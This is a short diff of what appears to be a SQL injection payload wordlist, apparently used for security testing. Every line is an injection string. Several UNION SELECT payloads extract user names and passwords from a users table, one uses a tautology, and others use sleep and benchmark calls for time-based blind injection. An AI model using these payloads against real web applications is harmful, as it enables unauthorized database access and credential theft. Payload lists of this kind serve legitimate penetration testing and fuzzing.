@@ -1,7 +1,7 @@
 'UNION SELECT user, password FROM users#
 1 or 1=1 UNION SELECT user, password FROM users#
 1'UNION SELECT user, password FROM users#
-1' or sleep(4)#
+1 or sleep(4)#
 1' benchmark(10000000,MD5(1))#
-ragnarlothbrok--
+5--
 SELECT username, password FROM users
